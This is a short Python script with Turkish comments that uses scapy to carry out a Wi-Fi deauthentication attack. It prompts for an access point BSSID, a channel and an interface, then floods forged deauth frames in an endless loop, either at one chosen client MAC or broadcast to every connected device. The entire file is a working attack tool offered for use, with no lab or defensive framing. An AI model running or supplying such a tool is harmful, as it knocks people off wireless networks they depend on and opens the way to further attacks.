import subprocess
import time
from scapy.all import *
import signal
import sys

def change_channel(channel, iface):
    """ Kanalı değiştirir (wlan0 veya wlan0mon üzerinden) """
    subprocess.call(['iw', 'dev', iface, 'set', 'channel', str(channel)])

def send_deauth(bssid, target_mac=None, channel=1, iface="wlan0"):
    """ Deauth paketini gönderir """
    # Kanalı değiştir
    change_channel(channel, iface)

    # Eğer hedef MAC adresi verilmişse, sadece o cihaza deauth gönder
    if target_mac:
        # Tek bir cihaz için deauth paketi oluştur
        packet = RadioTap()/Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
    else:
        # Tüm cihazlara deauth paketi oluştur
        packet = RadioTap()/Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
    
    # Paket gönder
    sendp(packet, iface=iface, count=100, inter=0.1)  # iface parametresine göre çalışacak
    print(f"{'Tüm cihazlar' if not target_mac else 'Hedef cihaz'} için deauth gönderildi!")

def signal_handler(sig, frame):
    """ Programı düzgün şekilde durdurma """
    print("\nProgram durduruluyor...")
    sys.exit(0)  # Programı düzgün kapatır

def main():
    signal.signal(signal.SIGINT, signal_handler)  # Ctrl+C için handler ekle
    
    print("Deauth Saldırısı Başlatılıyor...")
    
    # Kullanıcıdan giriş al
    bssid = input("BSSID (Access Point MAC adresi): ")
    channel = int(input("Channel (Kanal): "))
    
    # Arayüz adı seçimi
    iface = input("Kullanılacak arayüz (wlan0 veya wlan0mon): ").strip()
    while iface not in ['wlan0', 'wlan0mon']:
        iface = input("Geçerli bir arayüz girin (wlan0 veya wlan0mon): ").strip()

    target_choice = input("Hedef cihazı atmak istiyor musunuz? (Evet/Hayır): ").lower()
    
    if target_choice == 'evet':
        target_mac = input("Hedef cihaz MAC adresi: ")
        while True:
            send_deauth(bssid, target_mac, channel, iface)
            time.sleep(1)  # Saldırıyı sürekli gönder
    else:
        while True:
            send_deauth(bssid, channel=channel, iface=iface)
            time.sleep(1)  # Saldırıyı sürekli gönder

if __name__ == "__main__":
    main()
